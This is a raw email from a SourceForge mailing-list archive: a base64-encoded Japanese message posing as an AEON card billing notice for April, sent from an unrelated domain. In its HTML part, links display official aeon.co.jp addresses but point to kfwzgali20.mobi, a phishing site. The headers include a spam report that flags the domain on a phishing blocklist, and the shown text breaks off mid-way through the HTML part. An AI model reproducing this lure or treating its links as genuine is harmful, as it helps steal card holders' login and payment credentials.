Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8A70B8C34E0
	for <lists+osst-users@lfdr.de>; Sun, 12 May 2024 04:25:27 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1s5yty-0007py-FW
	for lists+osst-users@lfdr.de;
	Sun, 12 May 2024 02:25:25 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <no-reply.email.aeon@cohuwxv.cn>) id 1s5ytu-0007po-Nf
 for osst-users@lists.sourceforge.net; Sun, 12 May 2024 02:25:22 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Date:Subject:To:From:
 Message-ID:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=RbNIFX+34KBi/4tknuj2vR/tJsFmz+dMMzx9RvcAUmE=; b=l44Z62fzkQVGRZv2su8kAlOEB+
 GEUpXtsGE9O+LJPrS1Nkkw46RQ65C35LR561JqQe3aVUmWElcwNkYlmfFLTTD4nAaDu1WsqCvlqW4
 n63GPkroTXbyFwpcp40FxK658AW8O3AocUSHxMbv1pOgizUMoV6rmq5mXYMObx6qDUXg=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Date:Subject:To:From:Message-ID:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=RbNIFX+34KBi/4tknuj2vR/tJsFmz+dMMzx9RvcAUmE=; b=H
 75hTm8OQNY2NATpNYG/hs5ZkJY9wAIqXa9VDxU+Qxti1HKkk+jbWMQVuymMN3HgeJAagTFvIqTUcV
 F9Z6mfW3NV+VQMGZNaMjLtFgBT7M6DksdXfuyMl5zClvMycnIpu1Z5gxnTOdYnyiSBVIbEEWI1Bej
 jeNp7rAV/9KPbu9M=;
Received: from [152.32.205.194] (helo=mail.cohuwxv.cn)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1s5yts-0005GB-PF for osst-users@lists.sourceforge.net;
 Sun, 12 May 2024 02:25:22 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=cohuwxv.cn; 
 h=Message-ID:From:To:Subject:Date:MIME-Version:Content-Type;
 i=no-reply.email.aeon@cohuwxv.cn;
 bh=RbNIFX+34KBi/4tknuj2vR/tJsFmz+dMMzx9RvcAUmE=;
 b=26d/N8M8hVq4c/n7j/fZGrQxeAIWJcfUnrbSTWUsFSrUIua2BgBDMLQwwcnx/lp6Uj3n1wLdZAPH
 EL0dsLUAPZ6ocNGmnS/7U1sQQQpdMaN/j+sDyhKclLScB+05t9uXWsp3AHng/agd9s4F8TUESwuo
 zY8wXwN4M/KJkiOHDDYJRU2fOSlZIPiBoghxVntzRKPOuDvyw0pJoA1+GSgFK5UMeATTvWl7b6ZM
 IGUm7EtFQ/B0YBi3EWE1K4athksjtIjJg1IiKq1X/xTrGAnVyZVQ3dQK9eyAGGtxE7Nf2LvoJFM9
 z429h/84JunSIlYYCln3wSTq3BVB9nfWzEQjfw==
Message-ID: <A18632F79AEB99010FCC702B19623D43@ecb.gsbzl>
From: =?utf-8?B?44Kk44Kq44Oz44Kr44O844OJ?= <no-reply.email.aeon@cohuwxv.cn>
To: <osst-users@lists.sourceforge.net>
Date: Sun, 12 May 2024 11:04:40 +0900
MIME-Version: 1.0
X-MSMail-Priority: High
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5512
X-Spam-Score: 0.1 (/)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  いつもイオンマークのカードをご利用いただき、ありがとうございます。
    本メールはWeb明細(環境宣言)にご登録いただいているお客さまにお送りし�
    [...] 
 
 Content analysis details:   (0.1 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
                             blocked.  See
                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
                              for more information.
                             [URIs: kfwzgali20.mobi]
  0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
                             [URIs: kfwzgali20.mobi]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
                             high trust
                             [152.32.205.194 listed in list.dnswl.org]
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
                             blocklist
                             [URIs: cohuwxv.cn]
 -0.0 SPF_PASS               SPF: sender matches SPF record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 HTTPS_HTTP_MISMATCH    BODY: No description available.
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
                             author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
                             valid
  2.0 PYZOR_CHECK            Listed in Pyzor
                             (https://pyzor.readthedocs.io/en/latest/)
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
X-Headers-End: 1s5yts-0005GB-PF
Subject: [Osst-users] =?utf-8?b?NOaciOOBlOiri+axgumhjeOBruOBiuefpeOCiQ==?=
 =?utf-8?b?44Gb?=
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1381483886700269070=="
Errors-To: osst-users-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

--===============1381483886700269070==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0F9E_014E2029.16550CE0"

This is a multi-part message in MIME format.

------=_NextPart_000_0F9E_014E2029.16550CE0
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: base64

44GE44Gk44KC44Kk44Kq44Oz44Oe44O844Kv44Gu44Kr44O844OJ44KS44GU5Yip55So44GE44Gf
44Gg44GN44CB44GC44KK44GM44Go44GG44GU44GW44GE44G+44GZ44CCDQrmnKzjg6Hjg7zjg6vj
ga9XZWLmmI7ntLAo55Kw5aKD5a6j6KiAKeOBq+OBlOeZu+mMsuOBhOOBn+OBoOOBhOOBpuOBhOOC
i+OBiuWuouOBleOBvuOBq+OBiumAgeOCiuOBl+OBpuOBiuOCiuOBvuOBmeOAgg0KDQo05pyI44Gu
44GU6KuL5rGC6aGN44GM56K65a6a44GE44Gf44GX44G+44GX44Gf44CCDQoNCuKUgeKUgeKUgeKU
geKUgeKUgeKUgeKUgQ0K44GK5pSv5omV44GE44Gr44Gk44GE44GmDQrilIHilIHilIHilIHilIHi
lIHilIHilIENCuOBlOWIqeeUqOOCq+ODvOODiSDvvJog44Kk44Kq44Oz44Kr44O844OJ44K744Os
44Kv44OIDQrjgYrmlK/miZXml6Ug77yaMjAyNOW5tDXmnIgxNuaXpQ0KDQrlj6Pluqfmrovpq5jj
ga7jgZTnorroqo3jg7vjgZTlhaXph5Hjga/jgIHjgYrmlK/miZXml6Xjga7liY3llrbmpa3ml6Xj
gb7jgafjgavjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgIINCuOBlOWIqeeUqOaYjue0sOOBr+OA
geOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOBvuOBn+OBr+ODm+ODvOOD
oOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOAjeOBuOODreOCsOOC
pOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgg0KDQrilrzjgZToq4vmsYLm
mI7ntLDjga7jgZTnorroqo3jga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBw
Lw0KDQrigLvjg6Hjg7zjg6vkvZzmiJDmmYLngrnjgafjga7oq4vmsYLnorrlrprpoY3jgavjgarj
gorjgb7jgZnjgILjgZTliKnnlKjnirbms4Hjgavjgojjgorlho3luqboq4vmsYLpoY3norrlrprj
g6Hjg7zjg6vjgpLjgYrpgIHjgorjgZnjgovloLTlkIjjgYzjgZTjgZbjgYTjgb7jgZnjgIINCuKA
u+OBiuW8leiQveWPo+W6p+OBruioreWumuOBjOWujOS6huOBl+OBpuOBhOOBquOBhOWgtOWQiOOB
r+OAgeaciOacq+mgg+OBq+eZuumAgeOBhOOBn+OBl+OBvuOBmeOCs+ODs+ODk+ODi+OBruaMr+i+
vOeUqOe0meOBp+OBruOBiuaUr+aJleOBhOOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAguOB
iuW8leiQveWPo+W6p+OBruioreWumuOBjOWujOS6huOBl+OBn+OBi+OBlOS4jeaYjuOBquWgtOWQ
iOOBr+S4i+iomOOCiOOCiuOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgg0KaHR0cHM6Ly9mYXEuYWVv
bi5jby5qcC9mYXEvc2hvdy82NjA/c2l0ZV9kb21haW49ZGVmYXVsdA0K4oC75LiA6YOo44CB44GK
5byV6JC95pel44GM55Ww44Gq44KL44Kr44O844OJ44GM44GU44GW44GE44G+44GZ44CCDQoNCuKU
geKUgeKUgeKUgeKUgeKUgeKUgeKUgQ0KV0FPTiBQT0lOVOOBq+OBpOOBhOOBpg0K4pSB4pSB4pSB
4pSB4pSB4pSB4pSB4pSBDQrjgq/jg6zjgrjjg4Pjg4jjg7vjg4fjg5Pjg4Pjg4jmiZXjgYTjgafj
gZ/jgb7jgotXQU9OIFBPSU5U5pWw44Gv5q+O5pyIMjXml6Xjgavjg4fjg7zjgr/jgYzmm7TmlrDj
gZXjgozjgb7jgZnjgILjgqLjg5fjg6rjgIzjgqTjgqrjg7Pjgqbjgqnjg6zjg4Pjg4jjgI3jgb7j
gZ/jga/jg5vjg7zjg6Djg5rjg7zjgrjjgIzmmq7jgonjgZfjga7jg57jg43jg7zjgrXjgqTjg4jj
gI3jgbjjg63jgrDjgqTjg7PjgYTjgZ/jgaDjgY3jgZTnorroqo3jgY/jgaDjgZXjgYTjgIINCihX
QU9OIFBPSU5U44GM6YCy5ZGI44GV44KM44Gq44GE44Kr44O844OJ44Gv44GU5Yip55So44GE44Gf
44Gg44GR44G+44Gb44KTKQ0KDQrilrzmmq7jgonjgZfjga7jg57jg43jg7zjgrXjgqTjg4jjga/j
gZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3BvaW50Lw0K4pa8V0FPTiBQT0lO
VOOBruS9v+OBiOOCi+W6l+iIl+ODu+S9v+OBhOaWueOBq+mWouOBl+OBpuOBr+OBk+OBoeOCiQ0K
aHR0cHM6Ly9mYXEuYWVvbi5jby5qcC9mYXEvc2hvdy81NjI/YmFjaz1mcm9udCUyRmNhdGVnb3J5
JTNBc2hvdyZjYXRlZ29yeV9pZD0xNjYmcGFnZT0xJnNpdGVfZG9tYWluPWRlZmF1bHQmc29ydD1z
b3J0X2FjY2VzcyZzb3J0X29yZGVyPWRlc2MgDQoNCuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgQ0K
44Ki44OX44Oq44KE44Oh44O844Or44Gn44GK44OI44Kv44Gq5oOF5aCx44GM5Y+X5Y+W44KM44G+
44GZ77yBDQrilIHilIHilIHilIHilIHilIHilIHilIENCuOCpOOCquODs+OCq+ODvOODieWFrOW8
j+OCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOBquOCieOBlOWIqeeUqOaY
jue0sOOBrueiuuiqjeOChOODneOCpOODs+ODiOS6pOaPm+OBr+OCguOBoeOCjeOCk+OAgeS8muWT
oemZkOWumuOCr+ODvOODneODs+OCguWIqeeUqOOBp+OBjeS+v+WIqeOBp+OBiuODiOOCr+KZqg0K
4pa8aVBob25l44KS44GK5oyB44Gh44Gu5pa544Gv44GT44Gh44KJDQpodHRwczovL2l0dW5lcy5h
cHBsZS5jb20vanAvYXBwL2Flb24td2FsbGV0L2lkMTEwMDU2NDg0Mj9sPWphJmxzPTEmbXQ9OA0K
4pa8QW5kcm9pZOOCueODnuODm+OCkuOBiuaMgeOBoeOBruaWueOBr+OBk+OBoeOCiQ0KaHR0cHM6
Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWpwLmNvLmFlb24uY3JlZGl0
LmFuZHJvaWQud2FsbGV0DQoNCuKWvOOCpOOCquODs+OBquOBqeOBp+OBruOBiuiyt+OBhOeJqeaD
heWgseOChOOCq+ODvOODieOCreODo+ODs+ODmuODvOODs+aDheWgseOCguOBhOOBoeaXqeOBj+OB
iuWxiuOBke+8geODoeODvOODq+ODnuOCrOOCuOODs+OBruOBlOeZu+mMsuOBr+OBk+OBoeOCiQ0K
aHR0cHM6Ly93d3cuYWVvbi5jby5qcC9zZXJ2aWNlL25ld3NsZXR0ZXIvDQrilIHilIHilIHilIHi
lIHilIHilIHilIENCuOBiuWuouOBleOBvuaDheWgseOBruacgOaWsOWMluOBq+OBpOOBhOOBpg0K
4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrjgZTnmbvpjLLmg4XloLEo5rCP5ZCN44CB5L2P5omA
44CB6YCj57Wh5YWI44CB44Oh44O844Or44Ki44OJ44Os44K544Gq44GpKeOBq+WkieabtOOBjOOB
lOOBluOBhOOBvuOBl+OBn+OCieOAgeaaruOCieOBl+OBruODnuODjeODvOOCteOCpOODiOOCiOOC
iuOBiuaJi+e2muOBjeOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAgg0KDQriiarkvY/miYDl
pInmm7TmiYvntprjgY3jga7jgYrpoZjjgYTiiasNCuOBiuW8lei2iuOBl+OBquOBqeOBp+S9j+aJ
gOOBq+WkieabtOOBjOeUn+OBmOOBn+mam+OBq+OBr+OAgeOBiuaXqeOCgeOBq+S9j+aJgOWkieab
tOOBruWxiuWHuuOCkuOBiumhmOOBhOOBhOOBn+OBl+OBvuOBmeOAguOBiuWxiuOBkeOBhOOBn+OB
oOOBkeOBquOBhOWgtOWQiOOAgemDtemAgeOBq+OCiOOCi+mHjeimgeOBquOBiuefpeOCieOBm+OB
jOWxiuOBi+OBquOBhOWgtOWQiOOCguOBguOCiuOBvuOBmeOBruOBp+OBlOazqOaEj+OBj+OBoOOB
leOBhOOAgg0KDQrilrzjgqvjg7zjg4nnmbvpjLLlhoXlrrnnhafkvJrjg7vlpInmm7TjgavjgaTj
gYTjgabjga/jgZPjgaHjgokNCmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWlyeS9jaGFuZ2Uv
DQoNCuKWvOODoeODvOODq+OCouODieODrOOCueOBruWkieabtOOBr+OBk+OBoeOCiSANCmh0dHBz
Oi8vd3d3LmFlb24uY28uanAvYXBwL3NldHRpbmdzL3Byb2ZpbGUvDQoNCu+8ne+8ne+8ne+8ne+8
ne+8ne+8ne+8ne+8nQ0K4pag44Kk44Kq44Oz44K544Kv44Ko44Ki44Oh44Oz44OQ44O8SUTjg7vj
g5Hjgrnjg6/jg7zjg4njgpLjgYrlv5jjgozjga7loLTlkIgNCmh0dHBzOi8vd3d3LmFlb24uY28u
anAvYXBwL3NlYXJjaF9pZF9wd19yZWlzc3VlLw0KDQrilqDjgYrllY/jgYTlkIjjgo/jgZvlhYgN
Cmh0dHBzOi8vd3d3LmFlb24uY28uanAvaW5xdWlyeS8NCg0K77yd77yd77yd77yd77yd77yd77yd
77yd77ydDQrjgZPjga7jg6Hjg7zjg6vjgqLjg4njg6zjgrlbIHN0YXRlbWVudEBlbWFpbC5hZW9u
LmNvLmpwIF3jga/pgIHkv6HlsILnlKjjgqLjg4njg6zjgrnjga7jgZ/jgoHjgIHjgZTov5Tkv6Hj
gYTjgZ/jgaDjgYTjgabjgoLjgZTnlKjku7bjga/mib/jgozjgb7jgZvjgpPjgIINCuW9k+ODoeOD
vOODq+OBq+OBiuW/g+W9k+OBn+OCiuOBruOBquOBhOaWueOBr+OAgeWkp+WkieOBiuaJi+aVsOOC
kuOBiuaOm+OBkeOBhOOBn+OBl+OBvuOBmeOBjOOAgeOBneOBruaXqOOCkuOBiuabuOOBjea3u+OB
iOOBhOOBn+OBoOOBjeS4i+iomOOCouODieODrOOCueOBvuOBp+OBiumAgeOCiuOBj+OBoOOBleOB
hOOAgg0KbmV0YnJhbmNoQGFlb24uY28uanANCg0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB
DQrnmbrooYzvvJrmoKrlvI/kvJrnpL7jgqTjgqrjg7PpioDooYwNCmh0dHBzOi8vd3d3LmFlb25i
YW5rLmNvLmpwLw0KDQrmpa3li5nlj5foqJfkvJrnpL7vvJrjgqTjgqrjg7Pjg5XjgqPjg4rjg7Pj
grfjg6Pjg6vjgrXjg7zjg5PjgrnmoKrlvI/kvJrnpL4NCmh0dHBzOi8vd3d3LmFlb25maW5hbmNp
YWwuY28uanAvDQoNCuOBk+OBruODoeODvOODq+OBq+aOsui8ieOBleOCjOOBn+WGheWuueOCkuio
seWPr+OBquOBj+i7oui8ieOBmeOCi+OBk+OBqOOCkuemgeOBmOOBvuOBmeOAgg0K4pSB4pSB4pSB
4pSB4pSB4pSB4pSB4pSB4pSB

------=_NextPart_000_0F9E_014E2029.16550CE0
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: base64

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMCBUcmFuc2l0aW9uYWwv
L0VOIj4NCjxIVE1MPjxIRUFEPg0KPE1FVEEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0
Zi04IiBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZT4NCjxNRVRBIG5hbWU9R0VORVJBVE9SIGNvbnRl
bnQ9Ik1TSFRNTCAxMS4wMC4xMDU3MC4xMDAxIj48L0hFQUQ+DQo8Qk9EWT7jgYTjgaTjgoLjgqTj
gqrjg7Pjg57jg7zjgq/jga7jgqvjg7zjg4njgpLjgZTliKnnlKjjgYTjgZ/jgaDjgY3jgIHjgYLj
gorjgYzjgajjgYbjgZTjgZbjgYTjgb7jgZnjgII8QlI+5pys44Oh44O844Or44GvV2Vi5piO57Sw
KOeSsOWig+Wuo+iogCnjgavjgZTnmbvpjLLjgYTjgZ/jgaDjgYTjgabjgYTjgovjgYrlrqLjgZXj
gb7jgavjgYrpgIHjgorjgZfjgabjgYrjgorjgb7jgZnjgII8QlI+PEJSPjTmnIjjga7jgZToq4vm
sYLpoY3jgYznorrlrprjgYTjgZ/jgZfjgb7jgZfjgZ/jgII8QlI+PEJSPuKUgeKUgeKUgeKUgeKU
geKUgeKUgeKUgTxCUj7jgYrmlK/miZXjgYTjgavjgaTjgYTjgaY8QlI+4pSB4pSB4pSB4pSB4pSB
4pSB4pSB4pSBPEJSPuOBlOWIqeeUqOOCq+ODvOODiSANCu+8miDjgqTjgqrjg7Pjgqvjg7zjg4nj
grvjg6zjgq/jg4g8QlI+44GK5pSv5omV5pelIA0K77yaMjAyNOW5tDXmnIgxNuaXpTxCUj48QlI+
5Y+j5bqn5q6L6auY44Gu44GU56K66KqN44O744GU5YWl6YeR44Gv44CB44GK5pSv5omV5pel44Gu
5YmN5Za25qWt5pel44G+44Gn44Gr44GK6aGY44GE44GE44Gf44GX44G+44GZ44CCPEJSPuOBlOWI
qeeUqOaYjue0sOOBr+OAgeOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOODg+ODiOOAjeOB
vuOBn+OBr+ODm+ODvOODoOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeODvOOCteOCpOOD
iOOAjeOBuOODreOCsOOCpOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOBleOBhOOAgjxC
Uj48QlI+4pa844GU6KuL5rGC5piO57Sw44Gu44GU56K66KqN44Gv44GT44Gh44KJPEJSPjxBIA0K
aHJlZj0iaHR0cHM6Ly9rZnd6Z2FsaTIwLm1vYmkiPmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBw
LzwvQT48QlI+PEJSPuKAu+ODoeODvOODq+S9nOaIkOaZgueCueOBp+OBruiri+axgueiuuWumumh
jeOBq+OBquOCiuOBvuOBmeOAguOBlOWIqeeUqOeKtuazgeOBq+OCiOOCiuWGjeW6puiri+axgumh
jeeiuuWumuODoeODvOODq+OCkuOBiumAgeOCiuOBmeOCi+WgtOWQiOOBjOOBlOOBluOBhOOBvuOB
meOAgjxCUj7igLvjgYrlvJXokL3lj6Pluqfjga7oqK3lrprjgYzlrozkuobjgZfjgabjgYTjgarj
gYTloLTlkIjjga/jgIHmnIjmnKvpoIPjgavnmbrpgIHjgYTjgZ/jgZfjgb7jgZnjgrPjg7Pjg5Pj
g4vjga7mjK/ovrznlKjntJnjgafjga7jgYrmlK/miZXjgYTjgpLjgYrpoZjjgYTjgYTjgZ/jgZfj
gb7jgZnjgILjgYrlvJXokL3lj6Pluqfjga7oqK3lrprjgYzlrozkuobjgZfjgZ/jgYvjgZTkuI3m
mI7jgarloLTlkIjjga/kuIvoqJjjgojjgorjgZTnorroqo3jgY/jgaDjgZXjgYTjgII8QlI+PEEg
DQpocmVmPSJodHRwczovL2tmd3pnYWxpMjAubW9iaSI+aHR0cHM6Ly9mYXEuYWVvbi5jby5qcC9m
YXEvc2hvdy82NjA/c2l0ZV9kb21haW49ZGVmYXVsdDwvQT48QlI+4oC75LiA6YOo44CB44GK5byV
6JC95pel44GM55Ww44Gq44KL44Kr44O844OJ44GM44GU44GW44GE44G+44GZ44CCPEJSPjxCUj7i
lIHilIHilIHilIHilIHilIHilIHilIE8QlI+V0FPTiANClBPSU5U44Gr44Gk44GE44GmPEJSPuKU
geKUgeKUgeKUgeKUgeKUgeKUgeKUgTxCUj7jgq/jg6zjgrjjg4Pjg4jjg7vjg4fjg5Pjg4Pjg4jm
iZXjgYTjgafjgZ/jgb7jgotXQU9OIA0KUE9JTlTmlbDjga/mr47mnIgyNeaXpeOBq+ODh+ODvOOC
v+OBjOabtOaWsOOBleOCjOOBvuOBmeOAguOCouODl+ODquOAjOOCpOOCquODs+OCpuOCqeODrOOD
g+ODiOOAjeOBvuOBn+OBr+ODm+ODvOODoOODmuODvOOCuOOAjOaaruOCieOBl+OBruODnuODjeOD
vOOCteOCpOODiOOAjeOBuOODreOCsOOCpOODs+OBhOOBn+OBoOOBjeOBlOeiuuiqjeOBj+OBoOOB
leOBhOOAgjxCUj4oV0FPTiANClBPSU5U44GM6YCy5ZGI44GV44KM44Gq44GE44Kr44O844OJ44Gv
44GU5Yip55So44GE44Gf44Gg44GR44G+44Gb44KTKTxCUj48QlI+4pa85pqu44KJ44GX44Gu44Oe
44ON44O844K144Kk44OI44Gv44GT44Gh44KJPEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly9rZnd6Z2Fs
aTIwLm1vYmkiPmh0dHBzOi8vd3d3LmFlb24uY28uanAvYXBwL3BvaW50LzwvQT48QlI+4pa8V0FP
TiANClBPSU5U44Gu5L2/44GI44KL5bqX6IiX44O75L2/44GE5pa544Gr6Zai44GX44Gm44Gv44GT
44Gh44KJPEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly9rZnd6Z2FsaTIwLm1vYmkiPmh0dHBzOi8vZmFx
LmFlb24uY28uanAvZmFxL3Nob3cvNTYyP2JhY2s9ZnJvbnQlMkZjYXRlZ29yeSUzQXNob3cmYW1w
O2NhdGVnb3J5X2lkPTE2NiZhbXA7cGFnZT0xJmFtcDtzaXRlX2RvbWFpbj1kZWZhdWx0JmFtcDtz
b3J0PXNvcnRfYWNjZXNzJmFtcDtzb3J0X29yZGVyPWRlc2MgDQo8L0E+PEJSPjxCUj7ilIHilIHi
lIHilIHilIHilIHilIHilIE8QlI+44Ki44OX44Oq44KE44Oh44O844Or44Gn44GK44OI44Kv44Gq
5oOF5aCx44GM5Y+X5Y+W44KM44G+44GZ77yBPEJSPuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgTxC
Uj7jgqTjgqrjg7Pjgqvjg7zjg4nlhazlvI/jgqLjg5fjg6rjgIzjgqTjgqrjg7Pjgqbjgqnjg6zj
g4Pjg4jjgI3jgarjgonjgZTliKnnlKjmmI7ntLDjga7norroqo3jgoTjg53jgqTjg7Pjg4jkuqTm
j5vjga/jgoLjgaHjgo3jgpPjgIHkvJrlk6HpmZDlrprjgq/jg7zjg53jg7PjgoLliKnnlKjjgafj
gY3kvr/liKnjgafjgYrjg4jjgq/imao8QlI+4pa8aVBob25l44KS44GK5oyB44Gh44Gu5pa544Gv
44GT44Gh44KJPEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly9rZnd6Z2FsaTIwLm1vYmkiPmh0dHBzOi8v
aXR1bmVzLmFwcGxlLmNvbS9qcC9hcHAvYWVvbi13YWxsZXQvaWQxMTAwNTY0ODQyP2w9amEmYW1w
O2xzPTEmYW1wO210PTg8L0E+PEJSPuKWvEFuZHJvaWTjgrnjg57jg5vjgpLjgYrmjIHjgaHjga7m
lrnjga/jgZPjgaHjgok8QlI+PEEgDQpocmVmPSJodHRwczovL2tmd3pnYWxpMjAubW9iaSI+aHR0
cHM6Ly9wbGF5Lmdvb2dsZS5jb20vc3RvcmUvYXBwcy9kZXRhaWxzP2lkPWpwLmNvLmFlb24uY3Jl
ZGl0LmFuZHJvaWQud2FsbGV0PC9BPjxCUj48QlI+4pa844Kk44Kq44Oz44Gq44Gp44Gn44Gu44GK
6LK344GE54mp5oOF5aCx44KE44Kr44O844OJ44Kt44Oj44Oz44Oa44O844Oz5oOF5aCx44KC44GE
44Gh5pep44GP44GK5bGK44GR77yB44Oh44O844Or44Oe44Ks44K444Oz44Gu44GU55m76Yyy44Gv
44GT44Gh44KJPEJSPjxBIA0KaHJlZj0iaHR0cHM6Ly9rZnd6Z2FsaTIwLm1vYmkiPmh0dHBzOi8v
d3d3LmFlb24uY28uanAvc2VydmljZS9uZXdzbGV0dGVyLzwvQT48QlI+4pSB4pSB4pSB4pSB4pSB
4pSB4pSB4pSBPEJSPuOBiuWuouOBleOBvuaDheWgseOBruacgOaWsOWMluOBq+OBpOOBhOOBpjxC
Uj7ilIHilIHilIHilIHilIHilIHilIHilIE8QlI+44GU55m76Yyy5oOF5aCxKOawj+WQjeOAgeS9
j+aJgOOAgemAo+e1oeWFiOOAgeODoeODvOODq+OCouODieODrOOCueOBquOBqSnjgavlpInmm7Tj
gYzjgZTjgZbjgYTjgb7jgZfjgZ/jgonjgIHmmq7jgonjgZfjga7jg57jg43jg7zjgrXjgqTjg4jj
gojjgorjgYrmiYvntprjgY3jgpLjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgII8QlI+PEJSPuKJ
quS9j+aJgOWkieabtOaJi+e2muOBjeOBruOBiumhmOOBhOKJqzxCUj7jgYrlvJXotorjgZfjgarj
ganjgafkvY/miYDjgavlpInmm7TjgYznlJ/jgZjjgZ/pmpvjgavjga/jgIHjgYrml6njgoHjgavk
vY/miYDlpInmm7Tjga7lsYrlh7rjgpLjgYrpoZjjgYTjgYTjgZ/jgZfjgb7jgZnjgILjgYrlsYrj
gZHjgYTjgZ/jgaDjgZHjgarjgYTloLTlkIjjgIHpg7XpgIHjgavjgojjgovph43opoHjgarjgYrn
n6XjgonjgZvjgYzlsYrjgYvjgarjgYTloLTlkIjjgoLjgYLjgorjgb7jgZnjga7jgafjgZTms6jm
hI/jgY/jgaDjgZXjgYTjgII8QlI+PEJSPuKWvOOCq+ODvOODieeZu+mMsuWGheWuueeFp+S8muOD
u+WkieabtOOBq+OBpOOBhOOBpuOBr+OBk+OBoeOCiTxCUj48QSANCmhyZWY9Imh0dHBzOi8va2Z3
emdhbGkyMC5tb2JpIj5odHRwczovL3d3dy5hZW9uLmNvLmpwL2lucXVpcnkvY2hhbmdlLzwvQT48
